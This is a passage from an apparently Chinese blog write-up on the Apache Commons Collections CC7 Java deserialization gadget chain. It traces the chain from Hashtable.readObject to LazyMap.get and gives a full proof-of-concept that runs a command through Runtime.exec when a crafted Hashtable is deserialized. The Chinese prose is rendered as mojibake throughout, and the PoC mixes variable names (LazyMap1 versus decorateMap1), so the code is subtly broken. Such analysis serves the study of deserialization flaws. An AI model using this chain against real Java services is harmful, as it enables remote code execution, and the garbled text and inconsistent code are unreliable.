<p>æ¯”å¦‚æˆ‘è¾“å…¥è‘¡è„è¿”å›10ï¼Œè¾“å…¥è¥¿ç“œè¿”å›3ï¼Œä¸‹æ¬¡è¾“å…¥è¥¿ç“œè¿˜æ˜¯è¿”å›3</p>
<p>(ä¼ å…¥ä¸åŒå‚æ•°æ—¶ï¼Œå“ˆå¸Œå€¼ä¸€å®šéƒ½ä¸ç›¸åŒä¹ˆï¼Ÿäº‹å®ä¸Šä»»ä½•ç®—æ³•åœ¨ç†è®ºä¸Šéƒ½ä¸èƒ½ä¿è¯ã€‚è¿™ç§å‚æ•°ä¸åŒç»“æœç›¸åŒçš„æƒ…å†µå­¦åå«åšâ€œHashå†²çª(Hashç¢°æ’)â€ï¼ŒCC7å°±åˆ©ç”¨äº†è¿™ä¸ªå°æŠ€å·§)</p>
<p>åœ¨é‡åˆ° hash ç¢°æ’çš„æ—¶å€™, ä¼šè°ƒç”¨å…¶ä¸­ä¸€ä¸ªå¯¹è±¡çš„ equals æ–¹æ³•æ¥å¯¹æ¯”ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸åŒæ¥åˆ¤æ–­æ˜¯å¦çœŸçš„æ˜¯ hash ç¢°æ’ã€‚ åœ¨è¿™ä¹‹ä¸­ä½¿ç”¨çš„æ˜¯çˆ¶ç±» <code>AbstractMap</code> çš„ <code>equals()</code> æ–¹æ³•ã€‚	</p>
<p>é‚£<code>æ•£åˆ—å‡½æ•°(å“ˆå¸Œå‡½æ•°)</code>æœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å“ˆå¸Œå€¼çš„ç‰¹æ€§ï¼Œè®¾è®¡ä¸€å¼ å…¨æ–°çš„è¡¨ç»“æ„â€”-<code>æ•£åˆ—è¡¨(å“ˆå¸Œè¡¨ HashTable)</code></p>
<p><code>æ•£åˆ—è¡¨ï¼ˆå“ˆå¸Œè¡¨ HashTableï¼‰</code>ï¼Œæ˜¯æ ¹æ®å…³é”®ç å€¼(Key value)è€Œç›´æ¥è¿›è¡Œè®¿é—®çš„æ•°æ®ç»“æ„ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒé€šè¿‡æŠŠå…³é”®ç å€¼,æ˜ å°„åˆ°è¡¨ä¸­ä¸€ä¸ªä½ç½®æ¥è®¿é—®è®°å½•ï¼Œè¿™ä¸ªæ˜ å°„å‡½æ•°å«åš æ•£åˆ—å‡½æ•°(å“ˆå¸Œå‡½æ•°)ï¼Œå­˜æ”¾è®°å½•çš„æ•°ç»„å«åšæ•£åˆ—è¡¨ã€‚<br>æ•£åˆ—è¡¨(å“ˆå¸Œè¡¨ HashTable)æ˜¯ç”±æ•°ç»„+é“¾è¡¨å®ç°çš„â€”-æ•£åˆ—è¡¨åº•å±‚ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæ•°ç»„çš„ç´¢å¼•ç”±æ•£åˆ—è¡¨çš„ <code>key.hashCode()</code>ç»è¿‡è®¡ç®—å¾—åˆ°ï¼Œ æ•°ç»„çš„å€¼æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œæ‰€æœ‰å“ˆå¸Œç¢°æ’åˆ°ç›¸åŒç´¢å¼•çš„key-valueï¼Œéƒ½ä¼šè¢«é“¾æ¥åˆ°è¿™ä¸ªé“¾è¡¨åé¢ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603225326444.png" alt="image-20240603225326444"></p>
<h3 id="HashMapç»§æ‰¿å…³ç³»"><a href="#HashMapç»§æ‰¿å…³ç³»" class="headerlink" title="HashMapç»§æ‰¿å…³ç³»"></a>HashMapç»§æ‰¿å…³ç³»</h3><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603160518210.png" alt="image-20240603160518210"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤º<code>HashMap</code> æ˜¯<code>AbstractMap</code>çš„å®ç°ç±»ï¼Œ åŒæ—¶è¿™äºŒè€…å®ç°Mapæ¥å£ã€‚</p>
<p>HashMapä¸­æ²¡æœ‰å®ç°Mapæ¥å£çš„equals()æ–¹æ³•ï¼Œçˆ¶ç±»AbstractMapMapå®ç°äº†equals()æ–¹æ³•</p>
<h3 id="LazyMapç»§æ‰¿å…³ç³»"><a href="#LazyMapç»§æ‰¿å…³ç³»" class="headerlink" title="LazyMapç»§æ‰¿å…³ç³»"></a>LazyMapç»§æ‰¿å…³ç³»</h3><p><img src="https://image.sp4rks.xyz/2024/06/image-20240603160438448.png" alt="image-20240603160438448"></p>
<p>LazyMapæ˜¯AbstractMapDecoratorçš„å®ç°ç±»åŒæ—¶è¿™äºŒè€…å®ç°Mapæ¥å£ã€‚</p>
<p>LazyMapä¸­æ²¡æœ‰å®ç°equals()æ–¹æ³•ï¼Œçˆ¶ç±»AbstractMapDecoratorå®ç°äº†equals()æ–¹æ³•</p>
<p>(å¦‚æœä¸€ä¸ªç±»å®ç°äº†ä¸€ä¸ªæ¥å£ï¼Œé‚£ä¹ˆè¯¥ç±»å¿…é¡»å®ç°æ¥å£ä¸­å£°æ˜çš„æ‰€æœ‰æ–¹æ³•ï¼Œå¦‚æœä¸€ä¸ªæŠ½è±¡ç±»å®ç°äº†ä¸€ä¸ªæ¥å£ï¼Œå®ƒå¯ä»¥é€‰æ‹©ä¸å®ç°æ¥å£çš„æ‰€æœ‰æ–¹æ³•ï¼Œè€ŒæŠŠå®ç°çš„è´£ä»»äº¤ç»™å®ƒçš„å…·ä½“å­ç±»)</p>
<h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><p>çŒœæƒ³ä½œè€…æ˜¯å—äº†CC6çš„å¯å‘ï¼Œæ—¢ç„¶HashMapèƒ½å®ç°ååºåˆ—åŒ–æ¼æ´ï¼Œé‚£HashTableæ˜¯å¦ä¹Ÿå¯ä»¥ï¼Ÿæœ€ç»ˆæ˜¯å½¢æˆäº†CC7è¿™æ¡é“¾ã€‚</p>
<hr>
<p><code>Hashtable</code>çš„<code>readObject()</code>è°ƒç”¨äº†<code>reconstitutionPut()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">  table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>        threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>        count = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Read the number of elements and then all the key/value objects</span><br>        <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>            <span class="hljs-comment">// synch could be eliminated for performance</span><br>            reconstitutionPut(table, key, value);<br>            <br>é¦–å…ˆåˆ›å»ºä¸€ä¸ªEntryï¼Œè¿™æ˜¯ä¸Šæ–‡è®²åˆ°çš„æ•£åˆ—è¡¨ä¸­çš„é‚£ä¸ªæ•°ç»„ã€‚<br>sæ˜¯æˆ‘ä»¬ä¼ å…¥çš„è¾“å…¥æµ<br>ç„¶åè¿›å…¥<span class="hljs-keyword">for</span>å¾ªç¯ååºåˆ—åŒ–èµ‹å€¼ç»™ key,valueï¼Œç„¶åè°ƒç”¨reconstitutionPutæ–¹æ³•ã€‚<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155212582.png" alt="image-20240603155212582"></p>
<p>ç»§ç»­è·Ÿè¿› <code>reconstitutionPut()</code> æ–¹æ³•ï¼Œä¹‹åæˆ‘ä»¬çœ‹åˆ° <code>reconstitutionPut()</code> æ–¹æ³•è°ƒç”¨äº† <code>equals()</code> æ–¹æ³•â€”-<code>e.key.equals(key)</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>        <span class="hljs-keyword">throws</span> StreamCorruptedException<br>    &#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>        <br><span class="hljs-comment">//é€šè¿‡keyè®¡ç®—ä¸€ä¸ªhashå€¼ï¼Œç”¨è¿™ä¸ªå€¼è¿›è¡Œè®¡ç®—å¾—åˆ°indexã€‚è¿™ä¸ªindexå°±æ˜¯å‰é¢åˆ›å»ºçš„Entryæ•°ç»„çš„ç´¢å¼•ã€‚</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>     <br><span class="hljs-comment">//æ¯”è¾ƒå“ˆå¸Œå€¼e.hashæ˜¯å¦ä¸æ–°é”®çš„å“ˆå¸Œå€¼hashç›¸ç­‰ã€‚å¦‚æœå“ˆå¸Œå€¼ç›¸ç­‰ï¼Œå†æ¯”è¾ƒé”® e.key æ˜¯å¦ä¸æ–°é”® key ç›¸ç­‰ã€‚å¦‚æœä¸¤ä¸ªæ¡ä»¶éƒ½æ»¡è¶³ï¼Œåˆ™è¡¨ç¤ºå“ˆå¸Œè¡¨ä¸­å·²å­˜åœ¨ç›¸åŒçš„é”®ï¼ŒæŠ›å‡º StreamCorruptedException å¼‚å¸¸ã€‚</span><br>        <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>            <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>        tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>        count++;<br><br>e.key.equals(key)å…¶ä¸­ä¸¤ä¸ªkeyæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ<br>e.keyï¼šè¿™æ˜¯å½“å‰å“ˆå¸Œè¡¨ï¼ˆtableï¼‰ä¸­æŸä¸ªä½ç½®ï¼ˆindexï¼‰å·²å­˜åœ¨çš„é”®ã€‚eæ˜¯ä¸€ä¸ª Entry å¯¹è±¡ï¼Œè¡¨ç¤ºå“ˆå¸Œè¡¨ä¸­ä¸€ä¸ªæ§½ä½çš„é“¾è¡¨ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹ã€‚æ‰€ä»¥ï¼Œe.key æ˜¯å·²ç»å­˜å‚¨åœ¨å“ˆå¸Œè¡¨ä¸­çš„é”®ã€‚<br>keyï¼šè¿™æ˜¯ä»ååºåˆ—åŒ–è¾“å…¥æµï¼ˆObjectInputStreamï¼‰ä¸­è¯»å–çš„æ–°é”®ã€‚è¿™ä¸ªé”®æ˜¯åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä»æµä¸­è¯»å–çš„ï¼Œå¹¶ä¸”éœ€è¦æ’å…¥åˆ°å“ˆå¸Œè¡¨ä¸­ã€‚<br><br>å…¶ä¸­e.keyå¯æ§ï¼Œæ˜¯å› ä¸ºåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œé”®å’Œå€¼æ˜¯ç›´æ¥ä»è¾“å…¥æµä¸­è¯»å–çš„<br></code></pre></td></tr></table></figure>



<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155307188.png" alt="image-20240603155307188"></p>
<p>æ‰€ä»¥è¦çœ‹ä¸€ä¸‹å“ªé‡Œæœ‰<code>equals()</code> è¿™ä¸ªæ–¹æ³•ï¼Œæ‰¾åˆ°äº† <code>AbstractMapDecorator</code> è¿™ä¸ªç±»ä¸­å¯¹mapè°ƒç”¨äº†equals()æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240603155442086.png" alt="image-20240603155442086"></p>
<p><code>return map.equals(object)</code>ä¸­mapæ˜¯ä»€ä¹ˆï¼Ÿè¿™é‡Œåªæ˜¯<code>AbstractMapDecorator</code> ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸º <code>map</code> çš„å­—æ®µï¼Œå­˜å‚¨å¯¹å¦ä¸€ä¸ª <code>Map</code> å¯¹è±¡çš„å¼•ç”¨ã€‚</p>
<p>è¿™ä¸ªç±»æ˜¯ç»§æ‰¿äº† Map æ¥å£ï¼Œä½†æ˜¯ Map æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬éœ€è¦å»æ‰¾ Map çš„å®ç°ç±»ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604160438813.png" alt="image-20240604160438813"></p>
<p>ä¸Šé¢æœ€å¼€å§‹å°±è¯´äº†AbstractMapå®ç°äº†Mapæ¥å£ï¼Œå¹¶ä¸”å®ç°äº†equals()æ–¹æ³•</p>
<p>å¯ä»¥çœ‹è§æœ€ç»ˆè°ƒç”¨äº†<code>m.get()</code>æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯å¦‚æœ<code>m</code>å¯æ§ï¼Œåˆ™å¯ä»¥å®Œæˆè°ƒç”¨<code>LazyMap.get()</code>æ–¹æ³•è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚åœ¨è¿™é‡Œï¼Œ<code>m</code>ç”±ä¼ è¿›æ¥çš„å‚æ•°<code>o</code>æ§åˆ¶ï¼Œä¹Ÿå°±æ˜¯æœ€åˆçš„<code>key</code>ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604160036081.png" alt="image-20240604160036081"></p>
<p>è°ƒç”¨é“¾</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.readObject</span><br>    java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Hashtable</span><span class="hljs-selector-class">.reconstitutionPut</span><br>    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.AbstractMapDecorator</span><span class="hljs-selector-class">.equals</span><br>    java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.AbstractMap</span><span class="hljs-selector-class">.equals</span><br>    org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span>.get<br></code></pre></td></tr></table></figure>



<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        HashMap&lt;Object, Object&gt; hashMap2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);<br>        decorateMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">LazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);<br>        decorateMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(LazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(LazyMap2, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ChainedTransformer.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br>        decorateMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        serialize(hashtable);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªHashMap"><a href="#ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªHashMap" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªHashMap"></a>ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªHashMap</h3><p>å¦‚æœä¸¤ä¸ªhashmapç›¸åŒçš„è¯ä¼šç›´æ¥åœ¨<code>hashtable.put()</code>çš„æ—¶å€™è®¤ä¸ºæ˜¯ä¸€ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥ä¹‹åå°±ä¸ä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘equalsä»£ç </p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604202356973.png" alt="image-20240604202356973"></p>
<h3 id="ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªLazyMap"><a href="#ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªLazyMap" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªLazyMap"></a>ä¸ºä»€ä¹ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªLazyMap</h3><p>é¦–å…ˆçœ‹<code>HashTable.put</code>ï¼Œè¿™é‡Œå’Œ<code>reconstitutionPut</code>å¤„çš„ä»£ç ç±»ä¼¼ï¼Œéƒ½åŒ…å«äº†<code>*.key.equals(key))</code>ä»£ç ã€‚å…¶ä¸­<code>key</code>æ˜¯ä¼ å…¥çš„<code>LazyMap</code>ï¼Œ<code>tab</code>æ˜¯å…¨å±€çš„ä¸€ä¸ª<code>Entry</code>ï¼Œæ ¹æ®<code>hashcode</code>ç®—å‡ºä¸€ä¸ª<code>index</code>ï¼Œåªæœ‰<code>entry</code>ä¸­æœ‰å…ƒç´ æ‰ä¼šè¿›å…¥<code>for</code>å¾ªç¯ï¼Œä»è€Œè¿›ä¸€æ­¥è§¦å‘</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604205642784.png" alt="image-20240604205642784"></p>
<p>æ‰€ä»¥å¯ä»¥çœ‹å‡ºï¼Œå¿…é¡»è¦ä¸¤ä¸ªæˆ–ä»¥ä¸Šå…ƒç´ æ‰èƒ½è¿›å…¥<code>entry.key.equals(key))</code>æ–¹æ³•ã€‚ç±»ä¼¼åœ°ï¼Œååºåˆ—åŒ–çš„è§¦å‘ç‚¹<code>reconstitutionPut</code>å¤„ä¹Ÿæ˜¯è¿™æ ·çš„é€»è¾‘ï¼Œéœ€è¦ä¿è¯å¿…é¡»æœ‰ä¸¤ä¸ªæˆ–ä»¥ä¸Šå…ƒç´ </p>
<p>è¿›è€Œå¯ä»¥å¾—å‡ºçš„ç»“è®ºï¼Œèƒ½èµ°åˆ°<code>LazyMap.get</code>æ–¹æ³•çš„åªæœ‰<code>lazyMap2</code>è¿™ä¸€ä¸ªå¯¹è±¡</p>
<h3 id="ä¸ºä»€ä¹ˆé€‰æ‹©zZå’Œyyä½œä¸ºkey"><a href="#ä¸ºä»€ä¹ˆé€‰æ‹©zZå’Œyyä½œä¸ºkey" class="headerlink" title="ä¸ºä»€ä¹ˆé€‰æ‹©zZå’Œyyä½œä¸ºkey"></a>ä¸ºä»€ä¹ˆé€‰æ‹©zZå’Œyyä½œä¸ºkey</h3><p>ifä¸­çš„ç¬¬ä¸€ä¸ªæ¡ä»¶å°±æ˜¯<code>e.hash == hash</code>ï¼Œæ„æ€å°±æ˜¯ä¸¤ä¸ªkeyçš„hashå¿…é¡»ç›¸åŒã€‚é‚£ä¸ºä»€ä¹ˆä¸æŠŠä¸¤ä¸ªkeyè®¾æˆä¸€æ ·çš„å‘¢ï¼Ÿè¿™æ ·ä¸¤ä¸ªkeyçš„hashç»å¯¹ç›¸ç­‰çš„å•Šã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204417711.png" alt="image-20240604204417711"></p>
<p>ä½†æ˜¯å¦‚æœç»§ç»­å¾€ä¸‹è·Ÿä»£ç çš„è¯å°±ä¼šå‘ç°åœ¨<code>lazymap</code>çš„getæ–¹æ³•ä¸­æœ‰ä»¥ä¸‹é€»è¾‘ï¼Œmapçš„keyä¸èƒ½é‡å¤å¦åˆ™å°±ä¸ä¼šæ‰§è¡Œ<code>transform</code>å‡½æ•°æ‰§è¡Œä»£ç äº†ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204650378.png" alt="image-20240604204650378"></p>
<h3 id="ä¸ºä»€ä¹ˆHashtableéœ€è¦-put-ä¸¤æ¬¡"><a href="#ä¸ºä»€ä¹ˆHashtableéœ€è¦-put-ä¸¤æ¬¡" class="headerlink" title="ä¸ºä»€ä¹ˆHashtableéœ€è¦ put ä¸¤æ¬¡"></a>ä¸ºä»€ä¹ˆHashtableéœ€è¦ put ä¸¤æ¬¡</h3><p>åœ¨<code>Hashtable.reconstitutionPut()</code>æ–¹æ³•ä¸­ï¼Œç¬¬ä¸€æ¬¡è¿›å…¥æ—¶<code>tab</code>å†…å®¹ä¸ºç©ºï¼Œæ— æ³•è¿›å…¥ for å¾ªç¯ï¼Œè¿›è€Œæ²¡æ³•è°ƒç”¨åˆ°<code>key.equals()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604203934450.png" alt="image-20240604203934450"></p>
<p>ä¸ºäº†è°ƒç”¨ä¸¤æ¬¡<code>reconstitutionPut()</code>æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡<code>put()</code>ä¸¤æ¬¡å†…å®¹ï¼Œä½¿å¾—<code> elements</code>çš„å€¼ä¸º2ï¼Œè¿›è€Œåœ¨ for å¾ªç¯é‡Œè¿è¡Œä¸¤æ¬¡<code>reconstitutionPut()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604204034934.png" alt="image-20240604204034934"></p>
<h3 id="ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ "><a href="#ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ " class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ "></a>ä¸ºä»€ä¹ˆè¦ç§»é™¤ç¬¬äºŒä¸ªLazyMapä¸­çš„å…ƒç´ </h3><ul>
<li>ä¸ºä»€ä¹ˆæœ€åè¦<code>remove(&quot;yy&quot;)</code></li>
</ul>
<p>é—®é¢˜åœ¨<code>AbstractMap.equals()</code>æ–¹æ³•é‡Œï¼Œ<code>size()</code>çš„å€¼ä¸º 1ï¼Œè€Œ<code>m.size()</code>çš„å€¼ä¸º 2ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦<code>remove</code>æ‰ä¸€ä¸ªä½¿å…¶ç›¸ç­‰</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604210421463.png" alt="image-20240604210421463"></p>
<ul>
<li>ä¸ºä»€ä¹ˆæ˜¯<code>lazyMap2.remove(&quot;yy&quot;);</code>ï¼Ÿ</li>
</ul>
<p>åœ¨<code>Hashtable.put()</code>æ–¹æ³•æ—¶ä¹Ÿä¼šè°ƒç”¨ä¸€æ¬¡<code>entry.key.equals(key)</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604210702264.png" alt="image-20240604210702264"></p>
<p>å› æ­¤åœ¨<code>hashtable.put(decorateMap2, 2);</code>ä¹‹åè·Ÿåˆ°<code>AbstractMap().equals()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240604221340356.png" alt="image-20240604221340356"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œä¼ å…¥<code>LazyMap.get(key)</code>ä¸­çš„ key ä¸º<code>yy</code>ï¼Œç»§ç»­è·Ÿè¿›<code>LazyMap.get()</code>æ–¹æ³•</p>
